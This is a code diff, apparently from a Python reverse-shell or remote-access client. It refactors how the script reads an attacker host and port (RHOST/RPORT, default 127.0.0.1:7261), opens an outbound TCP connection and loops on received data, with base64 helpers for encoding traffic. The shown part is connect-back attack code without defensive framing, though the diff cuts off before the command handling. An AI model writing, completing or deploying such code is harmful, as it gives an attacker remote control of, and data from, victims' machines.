@@ -30,34 +30,34 @@ import platform
 import getpass
 import base64
 
-try:
-    RHOST = str(sys.argv[1])
-    RPORT = int(sys.argv[2])
-except:
-    RHOST = '127.0.0.1'
-    RPORT = 7261
-
 def encode(plain_message):
-
     plain_message_bytes = plain_message.encode('ascii')
     base64_message_bytes = base64.b64encode(plain_message_bytes)
     base64_message = base64_message_bytes.decode('ascii')
     return base64_message
 
 def decode(base64_message):
-
     base64_message_bytes = base64_message.encode('ascii')
     plain_message_bytes = base64.b64decode(base64_message_bytes)
     plain_message = plain_message_bytes.decode('ascii')
     return plain_message
 
 def main():
+    if (len(sys.argv) != 1) and (len(sys.argv) != 3):
+        sys.exit(0)
+    else:
+        try:
+            RHOST = str(sys.argv[1])
+            RPORT = int(sys.argv[2])
+        except:
+            RHOST = '127.0.0.1'
+            RPORT = 7261
 
     try:
         tcp_socket = socket.socket()
         tcp_socket.connect((RHOST, RPORT))
     except:
-        sys.exit(1)
+        sys.exit(0)
 
     while True:
         data = tcp_socket.recv(1024)
